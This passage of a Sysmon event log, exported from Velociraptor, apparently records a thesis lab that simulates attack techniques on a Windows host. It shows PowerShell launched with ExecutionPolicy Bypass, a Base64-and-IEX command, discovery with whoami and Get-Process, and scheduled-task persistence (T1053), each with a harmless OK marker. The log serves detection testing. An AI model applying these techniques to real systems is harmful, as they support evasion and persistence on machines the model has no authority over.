 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50633"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860510744,3,2026-07-12T12:47:08.7803876Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:47:20.768"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50634"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:14.2122709Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:48.364"",
 ""ProcessGuid"": ""{6bc49a7d-8cb8-6a53-7505-000000009a01}"",
 ""ProcessId"": 9804,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""Write-Host TEC001_OK; Start-Sleep 3\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:14.3140842Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:48.407"",
 ""ProcessGuid"": ""{6bc49a7d-8cb8-6a53-7605-000000009a01}"",
 ""ProcessId"": 11828,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \""Write-Host TEC001_OK; Start-Sleep 3\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cb8-6a53-7505-000000009a01}"",
 ""ParentProcessId"": ""9804"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""Write-Host TEC001_OK; Start-Sleep 3\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:47:14.828847Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:48.899"",
 ""ProcessGuid"": ""{6bc49a7d-8cb8-6a53-7605-000000009a01}"",
 ""ProcessId"": 11828,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_uuel3hk1.2xz.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:46:48.899"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:18.5897163Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:52.234"",
 ""ProcessGuid"": ""{6bc49a7d-8cbc-6a53-7705-000000009a01}"",
 ""ProcessId"": 9912,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:20.6617678Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:52.260"",
 ""ProcessGuid"": ""{6bc49a7d-8cbc-6a53-7805-000000009a01}"",
 ""ProcessId"": 2276,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \""$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cbc-6a53-7705-000000009a01}"",
 ""ParentProcessId"": ""9912"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:47:20.8285308Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:54.215"",
 ""ProcessGuid"": ""{6bc49a7d-8cbc-6a53-7805-000000009a01}"",
 ""ProcessId"": 2276,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_r01vrius.evm.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:46:54.215"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:33.7803966Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:06.523"",
 ""ProcessGuid"": ""{6bc49a7d-8cca-6a53-7905-000000009a01}"",
 ""ProcessId"": 11584,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c cmd.exe /c \""echo TEC002_OK \u0026 whoami \u0026 powershell.exe -NoProfile -Command Get-Process\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:33.821682Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:06.542"",
 ""ProcessGuid"": ""{6bc49a7d-8cca-6a53-7a05-000000009a01}"",
 ""ProcessId"": 10884,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""cmd.exe  /c \""echo TEC002_OK \u0026 whoami \u0026 powershell.exe -NoProfile -Command Get-Process\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cca-6a53-7905-000000009a01}"",
 ""ParentProcessId"": ""11584"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c cmd.exe /c \""echo TEC002_OK \u0026 whoami \u0026 powershell.exe -NoProfile -Command Get-Process\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:33.8433513Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:06.581"",
 ""ProcessGuid"": ""{6bc49a7d-8cca-6a53-7b05-000000009a01}"",
 ""ProcessId"": 11516,
 ""Image"": ""C:\\Windows\\System32\\whoami.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""whoami - displays logged on user information"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""whoami.exe"",
 ""CommandLine"": ""whoami  "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cca-6a53-7a05-000000009a01}"",
 ""ParentProcessId"": ""10884"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""cmd.exe  /c \""echo TEC002_OK \u0026 whoami \u0026 powershell.exe -NoProfile -Command Get-Process\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:33.89623Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:06.626"",
 ""ProcessGuid"": ""{6bc49a7d-8cca-6a53-7c05-000000009a01}"",
 ""ProcessId"": 8216,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -Command Get-Process"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cca-6a53-7a05-000000009a01}"",
 ""ParentProcessId"": ""10884"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""cmd.exe  /c \""echo TEC002_OK \u0026 whoami \u0026 powershell.exe -NoProfile -Command Get-Process\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:47:34.0502398Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:06.786"",
 ""ProcessGuid"": ""{6bc49a7d-8cca-6a53-7c05-000000009a01}"",
 ""ProcessId"": 8216,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_zs4utjnl.b4y.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:47:06.786"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:46.5799767Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:20.394"",
 ""ProcessGuid"": ""{6bc49a7d-8cd8-6a53-7d05-000000009a01}"",
 ""ProcessId"": 1084,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /create /tn \""TFM-TEC-003\"" /tr \""cmd.exe /c echo TEC003_OK ^\u003e C:\\Users\\Public\\tec003_ok.txt\"" /sc once /st 14:52 /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:46.6108992Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:20.437"",
 ""ProcessGuid"": ""{6bc49a7d-8cd8-6a53-7e05-000000009a01}"",
 ""ProcessId"": 5452,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""schtasks.exe  /create /tn \""TFM-TEC-003\"" /tr \""cmd.exe /c echo TEC003_OK ^\u003e C:\\Users\\Public\\tec003_ok.txt\"" /sc once /st 14:52 /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cd8-6a53-7d05-000000009a01}"",
 ""ParentProcessId"": ""1084"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /create /tn \""TFM-TEC-003\"" /tr \""cmd.exe /c echo TEC003_OK ^\u003e C:\\Users\\Public\\tec003_ok.txt\"" /sc once /st 14:52 /f"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:47:46.6559184Z,"{
 ""RuleName"": ""T1053"",
 ""UtcTime"": ""2026-07-12 12:47:20.503"",
 ""ProcessGuid"": ""{6bc49a7d-7994-6a53-1b00-000000009a01}"",
 ""ProcessId"": 1320,
 ""Image"": ""C:\\Windows\\system32\\svchost.exe"",
 ""TargetFilename"": ""C:\\Windows\\System32\\Tasks\\TFM-TEC-003"",
 ""CreationUtcTime"": ""2026-07-12 12:47:20.503"",
 ""User"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:48.7632221Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:22.991"",
 ""ProcessGuid"": ""{6bc49a7d-8cda-6a53-7f05-000000009a01}"",
 ""ProcessId"": 1048,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /query /tn \""TFM-TEC-003\"" /v /fo list"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:48.798492Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:23.023"",
 ""ProcessGuid"": ""{6bc49a7d-8cdb-6a53-8005-000000009a01}"",
 ""ProcessId"": 7292,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""schtasks.exe  /query /tn \""TFM-TEC-003\"" /v /fo list"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cda-6a53-7f05-000000009a01}"",
 ""ParentProcessId"": ""1048"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /query /tn \""TFM-TEC-003\"" /v /fo list"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:50.969119Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:25.589"",
 ""ProcessGuid"": ""{6bc49a7d-8cdd-6a53-8105-000000009a01}"",
 ""ProcessId"": 896,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /run /tn \""TFM-TEC-003\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:51.0020487Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:25.618"",
 ""ProcessGuid"": ""{6bc49a7d-8cdd-6a53-8205-000000009a01}"",
 ""ProcessId"": 5548,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""schtasks.exe  /run /tn \""TFM-TEC-003\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cdd-6a53-8105-000000009a01}"",
 ""ParentProcessId"": ""896"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /run /tn \""TFM-TEC-003\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:47:51.0379089Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:47:25.673"",
 ""ProcessGuid"": ""{6bc49a7d-8cdd-6a53-8305-000000009a01}"",
 ""ProcessId"": 4300,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /c echo TEC003_OK ^\u003e C:\\Users\\Public\\tec003_ok.txt"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-66ca-280000000000}"",
 ""LogonId"": ""0x28CA66"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""Medium"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7994-6a53-1b00-000000009a01}"",
 ""ParentProcessId"": ""1320"",
 ""ParentImage"": ""C:\\Windows\\System32\\svchost.exe"",
